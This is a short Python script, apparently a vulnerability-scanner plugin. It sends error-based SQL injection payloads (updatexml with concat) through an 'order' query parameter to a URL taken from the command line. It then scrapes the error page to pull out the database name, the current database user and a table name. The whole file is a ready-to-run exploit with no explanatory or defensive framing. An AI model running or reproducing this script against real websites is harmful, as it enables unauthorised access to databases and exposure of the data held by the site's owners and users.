#-*-coding:utf-8-*-
import requests
import txconfig
from bs4 import BeautifulSoup
import re
import sys


def main(param):
    headers = txconfig.Request_Param.HEADERS
    result = {
        "success":False,
        "dbs":{},
        "table":{},
        "username":{},
        "result": {}
    }
    try:
        url = param
    except Exception as e:
        result['result'] = e
        return result
    payloads = ['?order[updatexml(1,concat(0x7e,(SELECT%20database()),0x7e),1)]','?order[updatexml(1,concat(0x7e,(SELECT%20user()),0x7e),1)]','?order[updatexml(1,concat(0x7e,(select%20concat(table_name)%20from%20information_schema.tables%20%20where%20table_schema%3ddatabase()%20limit%200,1),0x7e),1)]']
    lists = []
    for payload in payloads:
        url = param
        url = url +payload
        Re = requests.get(url,headers = headers)
        content = BeautifulSoup(Re.text,"html.parser")
        list = content.h1.string
        column = re.findall(r'~(.*)~',list,re.M|re.I)[0]
        lists.append(column)

    result['dbs'] = lists[0]
    result['username'] = lists[1]
    result['table'] = lists[2]
    result['success'] = True
    return result

if __name__ == '__main__':
    param = sys.argv[1]
    print main(param)

